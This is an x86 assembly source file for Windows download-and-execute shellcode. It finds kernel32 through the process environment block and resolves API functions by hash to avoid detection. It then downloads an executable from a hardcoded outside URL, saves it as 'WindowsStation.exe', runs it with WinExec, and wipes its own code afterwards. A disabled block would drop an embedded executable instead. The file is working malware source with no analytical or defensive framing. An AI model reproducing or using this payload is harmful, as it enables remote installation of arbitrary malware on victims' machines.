USE32

ShellCode_Start:
call GetKernel32BaseAddress_Start
mov ebx,[esi + 0x3C]
add ebx,esi
call GetApiListFromHash_Start
push ebp
call GetCurrentAddress 
GetCurrentAddress:
BASE_OFFSET_CURRENT_ADDRESS equ (GetCurrentAddress - ShellCode_Start)
pop ebp
sub ebp,BASE_OFFSET_CURRENT_ADDRESS
;///////////////////////////////////////////////////////////////////////////////////////////
;push 0
;push 0x80
;push 4
;push 0
;push 1
;push 0x1F01FF
;lea ecx,[ebp + RunExeName]
;push ecx
;call [ebp + x86_CreateFileA]
;cmp eax,0xFFFFFFFF
;jz ShellCode_Return
;mov [ebp + x86_DownloaderHandle],eax
;push 0
;lea edx,[ebp + x86_RetWriteBytes]
;push edx
;push Downloader_End - Downloader_Start
;lea ecx,[ebp + Downloader_Start]
;push ecx
;push eax
;call [ebp + x86_WriteFile]
;mov ebx,eax
;mov ecx,[ebp + x86_DownloaderHandle]
;push ecx
;call [ebp + x86_CloseHandle]
;cmp ebx,0
;jz ShellCode_Return
;///////////////////////////////////////////////////////////////////////////////////////////
lea ecx,[ebp + Lib_User32_Name]
push ecx
call [ebp + x86_LoadLibraryA]
mov [ebp + x86_User32Module],eax
lea edx,[ebp + MessageBoxA_Name]
mov ecx,eax
push edx
push ecx
call [ebp + x86_GetProcAddress]
push 0
lea edx,[ebp + RunExeName]
push edx
lea ecx,[ebp + UrlAddress]
push ecx
push 0
call eax
mov ecx,[ebp + x86_User32Module]
push ecx
call [ebp + x86_FreeLibrary]
;///////////////////////////////////////////////////////////////////////////////////////////
%ifdef _URL_DOWNLOAD_FILE
lea ecx,[ebp + Lib_Urlmon_Name]
push ecx
call [ebp + x86_LoadLibraryA]
mov [ebp + x86_UrlMonModule],eax
lea ebx,[ebp + URLDownloadToFile_Name]
push ebx
push eax
call [ebp + x86_GetProcAddress]
mov [ebp + x86_URLDownloadToFile],eax

ShellCode_Download:
push 5000
call [ebp + x86_Sleep]
push 0
push 0
lea edx,[ebp + RunExeName]
push edx
lea ecx,[ebp + UrlAddress]
push ecx
push 0
call [ebp + x86_URLDownloadToFile]
cmp eax,0
jnz ShellCode_Return
;jnz ShellCode_Download
push 0
lea ecx,[ebp + RunExeName]
push ecx
call [ebp + x86_WinExec]
lea esi,[ebp + x86_UrlMonModule]
push esi
call [ebp + x86_FreeLibrary]
ShellCode_Return:
%endif
;///////////////////////////////////////////////////////////////////////////////////////////
pop ebp
mov esp,ebp
jmp ShellCode_Clean_Code

GetApiListFromHash_Start:
pushad
mov edx,[ebx + 0x78]
add edx,esi
xor ebx,ebx
mov ecx,[edx + 0x20]
add ecx,esi
mov eax,[edx + 0x1C]
add eax,esi
mov edi,[edx + 0x18]
mov ebp,[edx + 0x24]
add ebp,esi
Calc_Next:
mov edx,[ecx]
add edx,esi
push eax
push ebx
mov bx,[ebp + ebx * 2 + 0x00]
and ebx,0xFFFF
mov eax,[eax + ebx * 0x04]
add eax,esi
call CmpHashValueAndSaveApiAddress_Start
pop ebx
pop eax
add ecx,0x04
inc ebx
dec edi
jnz Calc_Next
popa
retn
GetApiListFromHash_End:

CmpHashValueAndSaveApiAddress_Start:
pushad
mov ebx,eax
call CalcApiNameHashValue_Start
mov edx,eax
call HashValue_GetCurrentAddress 
HashValue_GetCurrentAddress:
BASE_OFFSET_CURRENT_ADDRESS_HASH_VALUE equ (HashValue_GetCurrentAddress - ShellCode_Start)
pop ebp
sub ebp,BASE_OFFSET_CURRENT_ADDRESS_HASH_VALUE
lea esi,[ebp + MyUseApiHashValue]
lea edi,[ebp + MyUseApiSaveAddress]
CmpHashValueAndSaveApiAddress_Next:
add edi,0x04
lodsd
test eax,eax
jz CmpHashValueAndSaveApiAddress_Return
cmp eax,edx
jnz CmpHashValueAndSaveApiAddress_Next
mov [edi],ebx
CmpHashValueAndSaveApiAddress_Return:
popa
retn
CmpHashValueAndSaveApiAddress_End:

GetKernel32BaseAddress_Start:
mov edx,0x30
mov esi,[fs:edx]
mov esi,[esi + 0x0C]
mov esi,[esi + 0x0C]
lodsd
mov esi,[eax]
mov esi,[esi + 0x18]
retn
GetKernel32BaseAddress_End:

CalcApiNameHashValue_Start:
push ecx
push ebx
push edx
xor ecx,ecx
xor eax,eax
xor ebx,ebx
inc eax
CalcHashValue:
mov cl,[edx]
test cl,cl
jz Calc_Return
add eax,ecx
add ebx,eax
inc edx
jmp CalcHashValue
Calc_Return:
shl ebx,0x10
or eax,ebx
pop edx
pop ebx
pop ecx
ret
CalcApiNameHashValue_End:
Lib_Urlmon_Name					db "urlmon.dll",0
URLDownloadToFile_Name			db "URLDownloadToFileA",0
UrlAddress						db "http://www.bioskit.com/fuck.exe",0
RunExeName						db "WindowsStation.exe",0
Lib_User32_Name					db "user32.dll",0
MessageBoxA_Name				db "MessageBoxA",0
x86_User32Module				dd 0x00000000
x86_UrlMonModule				dd 0x00000000
;x86_DownloaderHandle			dd 0x00000000
;x86_RetWriteBytes				dd 0x00000000
;Downloader_Start:
;incbin './TestExe.exe'
;Downloader_End:
MyUseApiHashValue:

;HashValue_CreateFileA			dd 0x18D00416
;HashValue_WriteFile			dd 0x11C8038C
;HashValue_CloseHandle			dd 0x191C0443
HashValue_LoadLibraryA			dd 0x1D810497		;LoadLibraryA 0x1D810497
HashValue_FreeLibrary			dd 0x18F20458		;FreeLibrary
;HashValue_VirtualAlloc			dd 0x1F7004D3		;VirtualAlloc
;HashValue_VirtualFree			dd 0x1AAB046A		;VirtualFree
HashValue_GetProcAddress		dd 0x27C7057B		;GetProcAddress
HashValue_WinExec				dd 0x0AAD02B4		;WinExec
HashValue_Sleep					dd 0x05BD01FA		;Sleep
;HashValue_MessageBoxA			dd 0x197F0430		;MessageBoxA
HashValue_URLDownloadToFileA	dd 0x3F3906B0		;URLDownloadToFile
;HashValue_End					dd 0x00000000		;End

MyUseApiSaveAddress:
x86_Check_Resverd				dd 0x00000000
;x86_CreateFileA					dd 0x00000000
;x86_WriteFile					dd 0x00000000
;x86_CloseHandle					dd 0x00000000
x86_LoadLibraryA				dd 0x00000000
x86_FreeLibrary					dd 0x00000000
;x86_VirtualAlloc				dd 0x00000000
;x86_VirtualFree					dd 0x00000000
x86_GetProcAddress				dd 0x00000000
x86_WinExec						dd 0x00000000
x86_Sleep						dd 0x00000000
x86_URLDownloadToFile 			dd 0x00000000

ShellCode_Clean_Code:
call ShellCode_Clean_Code_Address 
ShellCode_Clean_Code_Address:
BASE_OFFSET_CURRENT_CLEAN_CODE_ADDRESS equ (ShellCode_Clean_Code_Address - ShellCode_Start)
pop eax
lea edi,[eax - BASE_OFFSET_CURRENT_CLEAN_CODE_ADDRESS]
mov ecx,ShellCode_Clean_Code - ShellCode_Start
xor eax,eax
rep stosb
popad
retn 0x0C
db 0x77
ShellCode_End:











